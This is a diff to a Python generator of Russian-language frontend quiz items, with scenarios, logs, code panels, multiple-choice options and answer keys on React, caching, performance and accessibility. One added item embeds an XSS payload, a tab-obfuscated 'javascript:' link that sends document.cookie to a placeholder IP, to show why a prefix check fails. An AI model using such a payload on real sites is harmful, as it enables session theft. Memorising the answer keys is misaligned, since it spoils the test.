@@ -16,9 +16,9 @@ def _(rng):
         _log(f"10:{s:02d}:01.205", "console", "WARN", f"The above error occurred in the <{comp}> component"),
         _log(f"10:{s:02d}:02.{ms:03d}", "network", "INFO", f"GET /api/{res} 200 ({ms + 900} ms), body: [{rng.randint(12, 80)} items]"),
     ]
-    opts, key = _choice(rng, "Первый рендер идёт до ответа API: начальное состояние undefined, нужно задать [] или показывать загрузку", [
-        f"API /api/{res} вернул не массив, а объект с полем {res}",
-        "Vite не пересобрал модуль после изменения, нужен полный перезапуск dev-сервера",
+    opts, key = _choice(rng, "Первый рендер идёт до ответа API: состояние undefined — задать [] или показывать загрузку", [
+        f"API /api/{res} вернул не массив, а объект с полем {res}: map вызывается у объекта, а не у массива",
+        "Vite не пересобрал модуль после изменения файла: нужен полный перезапуск dev-сервера с очисткой кэша",
         "У элементов списка нет key, поэтому React не может отрисовать map",
     ])
     return {"scene_title": "Белый экран", "story": f"Понедельник. Экран {comp} падает сразу при открытии. Состояние объявлено как useState(), данные грузятся в useEffect.",
@@ -37,8 +37,8 @@ def _(rng):
         _log("14:32:07", "browser", "WARN", "There was an error while hydrating. Switched to client rendering."),
         _log("14:32:08", "ssr", "INFO", f"GET /orders/{rng.randint(10000, 99999)} 200 render {rng.randint(40, 120)} ms (node, container ssr-{rng.randint(1, 4)})"),
     ]
-    opts, key = _choice(rng, "Дата форматируется в часовом поясе процесса, а на сервере и в браузере он разный: передавать timeZone явно или форматировать на клиенте", [
-        "CDN отдал закэшированный HTML от прошлой выкладки, поэтому время в разметке старое",
+    opts, key = _choice(rng, "Дата форматируется в часовом поясе процесса, а у сервера и браузера он разный: задать timeZone явно", [
+        "CDN отдал закэшированный HTML от прошлой выкладки, поэтому время в серверной разметке устарело",
         "Сервер рендеринга и браузер используют разные версии React",
         f"У элементов списка в {comp} неуникальные key, и React перепутал узлы при гидрации",
     ])
@@ -76,10 +76,12 @@ def _(rng):
         {"name": "LCP p75 главной, мс", "axis": "left", "max": 8000, "data": lcp},
         {"name": "вес главной, МБ", "axis": "right", "max": 10, "data": weight},
     ]}
-    opts, key = _choice(rng, "Пережать баннер в AVIF/WebP под размер экрана (srcset)", [
+    right = rng.choice(["Пережать баннер в AVIF/WebP под размер экрана (srcset)",
+                        f"Пережать баннер в AVIF/WebP и отдавать по srcset картинку под ширину экрана, а не исходник {w}×{hgt}"])
+    opts, key = _choice(rng, right, [
         "Добавить баннеру loading=\"lazy\", чтобы он не мешал загрузке остальной страницы",
         "Перенести скрипты аналитики в конец body, тогда главная станет легче",
-        "Включить HTTP/2 push для баннера, чтобы он приходил вместе с HTML",
+        rng.choice(["Включить HTTP/2 push для баннера", "Включить HTTP/2 push для баннера, чтобы он приходил вместе с HTML"]),
     ])
     return {"scene_title": "Медленная главная", "story": f"Маркетинг заменил баннер на главной на PNG {w}×{hgt}. С этого дня LCP вырос почти втрое, остальной код не менялся.",
             "prompt": "Что сделать в первую очередь?", "panel": panel, "options": opts, "key": key}
@@ -96,10 +98,10 @@ def _(rng):
         lines.append("  const user = useCurrentUser();")
     lines += ["  return (", f"    <{ctx}.Provider value={{{{ {q}, set{cap}, {s}, set{s.capitalize()} }}}}>",
               "      {children}", f"    </{ctx}.Provider>", "  );", "}", "", f"// DataTable: const {{ {s} }} = useContext({ctx});"]
-    opts, key = _choice(rng, f"Таблица читает весь контекст и перерисовывается от каждого символа: вынести {q} в отдельный контекст, value мемоизировать", [
-        "Заменить useState на useReducer: React перестанет перерисовывать потребителей контекста",
+    opts, key = _choice(rng, f"Таблица подписана на весь контекст: вынести {q} в отдельный контекст и мемоизировать value", [
+        "Заменить useState на useReducer: тогда React перестанет перерисовывать потребителей контекста при каждом вводе",
         "Перенести Provider в корень приложения, тогда таблица не будет обновляться при вводе",
-        "Это особенность dev-сборки: в production React не перерисовывает потребителей контекста",
+        "Это особенность dev-сборки: в production-сборке React не перерисовывает потребителей контекста при вводе",
     ])
     return {"scene_title": "Ввод тормозит", "story": f"Каждый символ в поле поиска перерисовывает все {n} строк DataTable, хотя таблица использует только {s}. Ввод заметно запаздывает.",
             "prompt": "Что исправить?", "panel": {"type": "code", "lang": "tsx", "lines": lines}, "options": opts, "key": key}
@@ -200,10 +202,10 @@ def _(rng):
         t += rng.randint(5, 40)
         lines.append(_log(f"Вт 11:{s:02d}:00.{t:03d}", "network", "INFO", f"GET /api/cart 200 ({rng.randint(150, 400)} ms) initiator: {w}.tsx"))
     lines.append(_log(f"Вт 11:{s:02d}:02.{rng.randint(100, 900):03d}", "lighthouse", "WARN", f"Time to Interactive {rng.randint(4, 7)}.{rng.randint(0, 9)} s"))
-    opts, key = _choice(rng, "Общий слой серверного состояния с кэшем и дедупликацией запросов (TanStack Query, SWR или свой загрузчик)", [
-        "Перенести запросы из useEffect в useLayoutEffect, чтобы они уходили раньше",
-        "Хранить ответы API в localStorage без срока жизни и не запрашивать их снова",
-        "Включить HTTP/2 на балансировщике: повторные запросы станут бесплатными",
+    opts, key = _choice(rng, "Общий слой серверного состояния с кэшем и дедупликацией (TanStack Query, SWR или свой загрузчик)", [
+        "Перенести все запросы из useEffect в useLayoutEffect, чтобы они уходили раньше первой отрисовки",
+        "Хранить ответы API в localStorage без срока жизни и больше никогда не запрашивать их повторно",
+        "Включить HTTP/2 на балансировщике: повторные запросы по одному соединению станут почти бесплатными",
     ])
     return {"scene_title": "Одни и те же запросы", "story": "Главная грузится медленно. В DevTools одни и те же запросы уходят по несколько раз: каждый виджет сам загружает данные в useEffect.",
             "prompt": "Как исправить архитектурно?", "panel": {"type": "logs", "lines": lines}, "options": opts, "key": key}
@@ -252,9 +254,9 @@ def _(rng):
     lines = ["function openModal() {", '  overlay.hidden = false;', '  modal.style.display = "block";', "}", "",
              '<div class="overlay" hidden></div>', '<div class="modal">', f"  <h2>{title}</h2>",
              '  <button class="btn">Да</button>', '  <button class="btn ghost">Отмена</button>', "</div>"]
-    opts, key = _choice(rng, "Открывать через <dialog>.showModal() или вручную: фокус в окно, ловушка фокуса, Esc и возврат фокуса на кнопку", [
+    opts, key = _choice(rng, "<dialog>.showModal() или вручную: фокус в окно, ловушка фокуса, Esc и возврат фокуса на кнопку", [
         "Поднять z-index окна выше всех элементов страницы, тогда Tab не уйдёт под него",
-        "Добавить окну role=\"alert\": скринридер сам переведёт туда фокус",
+        "Добавить окну role=\"alert\": скринридер сам переведёт туда фокус и удержит его в окне",
         "Сделать подложку непрозрачной, чтобы страница под окном не отвлекала",
     ])
     return {"scene_title": "Окно с клавиатуры", "story": f"Окно «{title}» открывается по кнопке. С клавиатуры фокус остаётся на странице под окном, Tab ходит по ссылкам за подложкой, Esc ничего не делает.",
@@ -267,9 +269,9 @@ def _(rng):
     lines = [f"function {comp}() {{", "  const [error, setError] = useState(null);", "  // submit() вызывает setError(текст) при ошибке сервера", "  return (",
              "    <form onSubmit={submit}>", "      {/* … поля … */}", "      {error && (", '        <div role="status" aria-live="polite">{error}</div>', "      )}",
              "    </form>", "  );", "}"]
-    opts, key = _choice(rng, "Live-регион должен быть в DOM до изменения: рендерить контейнер всегда и менять только текст в нём", [
-        "Заменить polite на assertive: тогда объявление гарантировано в любом скринридере",
-        "Добавить контейнеру tabindex=\"0\", чтобы скринридер его заметил",
+    opts, key = _choice(rng, "Live-регион должен быть в DOM до изменения: рендерить контейнер всегда, менять только текст", [
+        "Заменить polite на assertive: тогда объявление гарантировано в любом скринридере и при любом рендере",
+        "Добавить контейнеру tabindex=\"0\", чтобы скринридер заметил его и прочитал сообщение",
         "Продублировать текст ошибки в aria-label всей формы",
     ])
     return {"scene_title": "Немая ошибка", "story": f"Ошибку «{msg}» видно на экране, но скринридер её не объявляет, хотя у контейнера стоит aria-live.",
@@ -300,9 +302,9 @@ def _(rng):
     i1, i2, i3 = rng.randint(1, 9), rng.randint(10, 99), rng.randint(100, 999)
     lines = ["[", f'  {{ "id": {i1}, "parentId": null, "name": "{root}" }},', f'  {{ "id": {i3}, "parentId": {i2}, "name": "{leaf}" }},',
              f'  {{ "id": {i2}, "parentId": {i1}, "name": "{child}" }},', "  …", "]"]
-    opts, key = _choice(rng, "Один раз построить Map id → категория и подниматься по parentId до корня: путь за O(глубины)", [
+    opts, key = _choice(rng, "Построить Map id → категория один раз и подниматься по parentId до корня: O(глубины)", [
         "На каждом уровне заново фильтровать весь список по parentId: это O(log n)",
-        "Отсортировать категории по name и искать родителя бинарным поиском",
+        "Отсортировать категории по name и искать родителя каждого узла бинарным поиском: O(log n) на шаг",
         "Сериализовать список в строку и искать цепочку родителей регулярным выражением",
     ])
     return {"scene_title": "Хлебные крошки", "story": f"API отдаёт {n} тыс. категорий плоским списком с parentId, порядок произвольный. Для «хлебных крошек» на каждой странице нужен путь от корня до текущей категории.",
@@ -316,10 +318,94 @@ def _(rng):
     lines = [f"// {n} тыс. строк, высота каждой известна после измерения", f"const heights = [{', '.join(map(str, hs))}, …];",
              "const offsets = prefixSums(heights); // offsets[i] — верх строки i, массив возрастает", "", "function firstVisible(scrollTop: number): number {",
              "  // ?", "}"]
-    opts, key = _choice(rng, "Бинарный поиск по offsets: O(log n) на кадр", [
+    right = rng.choice(["Бинарный поиск по offsets: O(log n) на кадр",
+                        "Бинарный поиск по возрастающему offsets: последняя строка с offset ≤ scrollTop, O(log n) на кадр"])
+    opts, key = _choice(rng, right, [
         "Идти от первой строки, суммируя высоты: на кадр это O(1)",
         "Разделить scrollTop на среднюю высоту строки: результат точный",
-        "Хеш-таблица offset → индекс: поиск по любому scrollTop за O(1)",
+        rng.choice(["Хеш-таблица offset → индекс, O(1)", "Хеш-таблица offset → индекс: поиск по любому scrollTop за O(1)"]),
     ])
     return {"scene_title": "Виртуальный список", "story": f"Лента из {n} тыс. {what} с разной высотой строк. На каждом кадре прокрутки нужно найти первую видимую строку по scrollTop.",
             "prompt": "Как реализовать firstVisible?", "panel": {"type": "code", "lang": "ts", "lines": lines}, "options": opts, "key": key}
+
+
+# --- уровень Lead: компромиссы архитектуры, диагностика по нескольким сигналам, тонкие баги ревью ---
+
+
+@family("fe_arch_cdn_personal", "Frontend", "Архитектура клиента", "choice", 2.3, 2.4)
+def _(rng):
+    page, who, n = rng.choice([("/catalog", "имя пользователя", 7), ("/", "чужая корзина", 4), ("/orders", "чужой номер телефона", 11)])
+    ttl = rng.choice([60, 120, 300])
+    lines = [
+        _log("10:41:02", "cdn-edge", "INFO", f"GET {page} 200 x-cache: HIT age={rng.randint(5, ttl - 1)}"),
+        _log("10:41:02", "cdn-edge", "INFO", f"response: cache-control: public, s-maxage={ttl}; vary: Accept-Encoding"),
+        _log("10:41:03", "web-ssr", "INFO", f"render {page} user=u_{rng.randint(1000, 9999)} stream=on 182 ms"),
+        _log("10:41:09", "support", "WARN", f"жалоба #{rng.randint(300, 900)}: в шапке {who}"),
+        _log("10:41:30", "cdn-edge", "INFO", f"hit ratio {page}: {rng.randint(88, 95)} %, origin RPS −{rng.randint(70, 85)} %"),
+    ]
+    opts, key = _choice(rng, "Каркас — в кэш CDN, персональный блок — отдельным запросом с Cache-Control: private", [
+        "Добавить Vary: Cookie — CDN будет хранить отдельную копию страницы для каждого пользователя",
+        f"Снизить s-maxage до 5 секунд: окно, в котором видна {who}, станет пренебрежимым",
+        rng.choice(["Выключить потоковый SSR: при стриминге ответы разных запросов смешиваются",
+                    "Выключить потоковый SSR"]),
+    ])
+    return {"scene_title": "Чужие данные в шапке", "story": f"Чтобы выдержать распродажу, {page} начали кэшировать на CDN на {ttl} с. Нагрузка на сервер упала, но за {n} минут пришли жалобы: в шапке — {who}.",
+            "prompt": "Как исправить, сохранив выигрыш от кэша?", "panel": {"type": "logs", "lines": lines}, "options": opts, "key": key}
+
+
+@family("fe_rv_cached_reject", "Frontend", "Ревью кода", "mark", 2.3, 2.6)
+def _(rng):
+    fn, api, typ = rng.choice([("loadSuggest", "/api/suggest", "Suggestion"), ("loadPrices", "/api/prices", "Price"), ("loadProfile", "/api/profiles", "Profile")])
+    lines = [f"const cache = new Map<string, Promise<{typ}[]>>();", ""]
+    if rng.random() < 0.5:
+        lines.append("// запрос дедуплицируется: одинаковые ключи ждут один и тот же промис")
+    lines += [f"export function {fn}(key: string): Promise<{typ}[]> {{", "  if (!cache.has(key)) {"]
+    lines.append(f"    cache.set(key, fetch(`{api}?q=${{encodeURIComponent(key)}}`).then(r => {{")
+    key = len(lines)
+    lines += ["      if (!r.ok) throw new Error(`HTTP ${r.status}`);", "      return r.json();", "    }));", "  }", "  return cache.get(key)!;", "}"]
+    m = rng.randint(2, 6)
+    return {"scene_title": "Вечная ошибка", "story": f"Сервис {api} лежал {m} минуты и отвечал 503. Он давно поднялся, но для части ключей {fn} до перезагрузки вкладки возвращает ошибку.",
+            "prompt": "Нажмите на строку с причиной.", "panel": {"type": "code", "lang": "ts", "lines": lines, "caption": f"PR #{rng.randint(500, 999)} · «дедупликация {fn}»"}, "key": key}
+
+
+@family("fe_dbg_url_scheme", "Frontend", "Отладка UI", "choice", 2.3, 2.75)
+def _(rng):
+    field, role = rng.choice([("website", "модератора"), ("portfolio", "рекрутера"), ("homepage", "администратора")])
+    host = f"203.0.113.{rng.randint(2, 250)}"
+    lines = ["function safeHref(raw: string): string {",
+             '  if (raw.trim().toLowerCase().startsWith("javascript:")) return "#";',
+             "  return raw;",
+             "}",
+             "",
+             f'<a href={{safeHref(profile.{field})}} target="_blank" rel="noopener">Сайт</a>',
+             f'// в базе: profile.{field} = "java\\tscript:fetch(\'//{host}/?c=\'+document.cookie)"']
+    opts, key = _choice(rng, "Парсер URL выкидывает табы внутри схемы: нужен белый список протоколов по new URL(raw).protocol", [
+        "trim() убирает пробелы только по краям — достаточно заменить его на replace(/\\s+/g, \"\") перед проверкой",
+        "Без noreferrer ссылка с target=_blank исполняется в контексте страницы — добавить rel=\"noopener noreferrer\"",
+        rng.choice(["React экранирует атрибуты, значит код пришёл через dangerouslySetInnerHTML в другом компоненте",
+                    "React экранирует атрибуты: ищите dangerouslySetInnerHTML"]),
+    ])
+    return {"scene_title": "Ссылка с сюрпризом", "story": f"Клик по ссылке «Сайт» в анкете выполнил скрипт в сессии {role}. Санитайзер ссылок на ревью выглядел нормально.",
+            "prompt": "Почему защита не сработала и как исправить надёжно?", "panel": {"type": "code", "lang": "tsx", "lines": lines}, "options": opts, "key": key}
+
+
+@family("fe_perf_leak", "Frontend", "Производительность", "choice", 2.4, 2.9)
+def _(rng):
+    a, b = rng.choice([("Заказы", "Отчёты"), ("Сделки", "Аналитика"), ("Задачи", "Календарь")])
+    sub = rng.choice(["ResizeObserver", "window.addEventListener(\"resize\")", "подписка на общую шину событий"])
+    x = [f"{5 * i} мин" for i in range(8)]
+    heap = [round(60 + i * rng.uniform(38, 46)) for i in range(8)]
+    inp = [rng.randint(90, 130) + i * rng.randint(45, 60) for i in range(8)]
+    panel = {"type": "chart", "x": x, "series": [
+        {"name": "JS heap после GC, МБ (RUM)", "axis": "left", "max": 500, "data": heap},
+        {"name": "INP p75, мс", "axis": "right", "max": 600, "data": inp},
+    ]}
+    detached = rng.randint(8, 30) * 1000
+    opts, key = _choice(rng, f"{sub[0].upper() + sub[1:]} не снимается в cleanup и держит отсоединённые узлы", [
+        f"Таблица во вкладке «{b}» не виртуализирована: тысячи узлов делают каждый кадр тяжёлым — виртуализировать",
+        "GC не успевает между long tasks: дробить работу через scheduler.yield, чтобы дать сборщику время",
+        rng.choice(["Это расширения браузера у части пользователей: в чистом профиле утечки нет",
+                    "Это расширения браузера: в чистом профиле Chrome проблема не воспроизводится, и чинить в коде нечего"]),
+    ])
+    return {"scene_title": "Тормозит к обеду", "story": f"Операторы весь день переключают вкладки «{a}» ↔ «{b}». Через полчаса интерфейс вязнет; в снимке кучи — {detached} Detached HTMLDivElement.",
+            "prompt": "В чём причина?", "panel": panel, "options": opts, "key": key}
